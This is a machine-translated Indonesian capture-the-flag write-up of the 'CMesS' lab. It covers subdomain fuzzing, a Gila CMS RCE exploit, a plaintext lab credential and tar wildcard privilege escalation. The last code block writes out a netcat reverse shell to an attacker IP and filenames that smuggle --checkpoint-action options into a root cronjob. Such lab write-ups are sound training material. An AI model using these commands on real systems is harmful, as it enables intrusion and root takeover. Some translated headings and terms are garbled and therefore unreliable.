---
title: "CMesS"
description: "Enum Port 80 - http pertama kita mengakses port 80, kita hanya mendapatkan halaman yang tidak menarik jadi kita melanjutkan dengan brute force direktori untuk menemukan halaman yang menarik Dirsearch: kita menemukan halaman yang menarik"
lang: "id"
translationKey: "cmess"
category: "lab-writeups"
tags: ["Lab", "Sub Domain Enum", "Gila CMS", "backup file", "/opt/password.bak", "Cronjobs-tar *", "Linux", "Medium"]
publishDate: "2025-08-19"
draft: false
featured: false
sample: false
author: "Dimas Sahid Abdullah"
translationStatus: "machine"
sourceLang: "en"
notionId: "2545fca1-ed80-8018-8289-ebcdb30b58c8"
notionUrl: "https://app.notion.com/p/CMesS-2545fca1ed8080188289ebcdb30b58c8"
notionLastEdited: "2025-08-20T18:06:00.000Z"
---

# Enum

![](/images/cmess/bc9628f1623e.png)

## Port 80 - http

Pertama, kami mengakses port 80 dan hanya mendapatkan halaman yang tidak menarik, jadi kami melanjutkan dengan melakukan brute force direktori untuk menemukan halaman yang menarik.

![](/images/cmess/7c2f722a2578.png)

Dirsearch:

![](/images/cmess/710da79d8bb1.png)

Kami menemukan halaman menarik yaitu halaman /feed dan /login yang memberi tahu kami untuk mengatur domain lokal menjadi cmess.thm di file /etc/hosts kami dan masuk ke Gila CMS.

![](/images/cmess/3073e8740ac2.png)

![](/images/cmess/a9e2134d44f0.png)

Mari kita konfigurasikan file /etc/hosts kita, kemudian akses target kita menggunakan domain (cmess.thm) lalu lakukan dirsearch lagi.

![](/images/cmess/6a0bd4e916b5.png)

![](/images/cmess/f6ac5867605f.png)

![](/images/cmess/a048ad9f0307.png)

Setelah melakukan dirsearch, kita tidak mendapatkan halaman yang menarik, kita hanya mendapatkan hal yang sama seperti sebelum mendaftarkan domain, jadi kita mencoba cara lain. Mari kita lakukan brute force pada subdomain menggunakan ffuf.

### Serangan Brute Force SubDomain

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://cmess.thm -H "Host: FUZZ.cmess.thm"
```

![](/images/cmess/6702e4652543.png)

Setelah melakukan brute force pada subdomain, kami menemukan bahwa semua subdomain terdiri dari 522 kata, tetapi hanya subdomain dev yang memberikan 191 kata. Jadi, mari kita lampirkan subdomain tersebut (dev.cmess.thm) ke IP target kita, lalu akses IP tersebut.

![](/images/cmess/8d122fb29340.png)

![](/images/cmess/718c2a55cb5a.png)

Setelah mengakses dev.cmess.thm, kami menemukan sesuatu yang menarik, yaitu kata sandi dan daftar email yang dapat kami gunakan untuk masuk ke Gila CMS.

![](/images/cmess/a3cf4c35ccdc.png)

![](/images/cmess/bf608897921c.png)

Setelah login, kami mengidentifikasi bahwa Gila CMS memiliki versi 1.10.9 yang memiliki celah keamanan RCE yang dapat diakses publik.

![](/images/cmess/7207931d0fc8.png)

Salin skrip eksploitasi ke sistem lokal dan jalankan.

![](/images/cmess/7346c5420131.png)

![](/images/cmess/78d307b58990.png)

![](/images/cmess/bf224fafeebd.png)

Setelah mendapatkan revshell, kita tidak bisa mendapatkan user.txt karena kita tidak memiliki izin untuk mengakses direktori Andre. Jadi kita perlu melakukan privesc untuk mendapatkan user Andre.

# Privasi Horizontal

Kacang polong:

![](/images/cmess/16bc7a539f07.png)

Saat menjalankan linpeas, kami tidak mendapatkan petunjuk apa pun. Kami memiliki cronjob tetapi tidak memiliki akses ke direktori /home/andre/backup, jadi mari kita cari cara lain.

Setelah mencari-cari, saya menemukan file kredensial cadangan, jadi saya membukanya dan kami menemukan kredensial pengguna andre.

![](/images/cmess/40e7ee320684.png)

![](/images/cmess/f86e0e8d4dff.png)

Masuk sebagai pengguna Andre menggunakan kredensial ini (andre:UQfsdCB7aAP6) lalu voila, kita mendapatkan user.txt

![](/images/cmess/b1f95f5d7f4c.png)

# Privasi Vertikal

Kacang polong:

![](/images/cmess/16bc7a539f07.png)

Kami menemukan bahwa cronjob memiliki tugas tar dengan tanda bintang (*) karena kami tahu itu dapat dieksploitasi, jadi mari kita eksploitasi dengan perintah ini: Voila, kita mendapatkan root .txt

Referensi : [https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/?ref=blog.tryhackme.com](https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/?ref=blog.tryhackme.com)

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.17.49.139 4444 >/tmp/f" > shell.sh
touch "/home/andre/backup/--checkpoint-action=exec=sh shell.sh"
touch "/home/andre/backup/--checkpoint=1"
```

![](/images/cmess/e3b20d230249.png)
